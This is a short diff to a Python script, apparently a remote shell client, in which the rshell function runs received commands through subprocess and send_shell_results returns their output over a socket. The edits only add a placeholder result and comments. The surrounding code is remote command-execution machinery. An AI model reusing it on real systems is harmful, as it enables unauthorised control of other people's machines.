@@ -76,7 +76,9 @@ def rshell(s):
                                   stdin=subprocess.PIPE)
         results = output.stdout.read().decode('utf-8')
         errors = output.stderr.read().decode('utf-8')
-        print(Fore.BLUE + "RShell results: " + Style.RESET_ALL + "{}".format(results if results else errors))
+        if not results and not errors:
+            results = "NONE"
+        print(Fore.BLUE + "RShell results: " + Style.RESET_ALL + "{}".format(results if results else errors)) # includes newline
 
         send_shell_results(s, results if results else errors)
 
@@ -86,7 +88,7 @@ def send_shell_results(s, results):
         data_to_send = results.encode("utf-8")
         # Send data in chunks
         for i in range(0, len(data_to_send), 1024):
-            s.sendall(data_to_send[i:i + 1024])
+            s.sendall(data_to_send[i:i + 1024]) # Send 1024 bytes at a time
         print("Sent results.")
     except BrokenPipeError:
         print("Connection closed by server.")
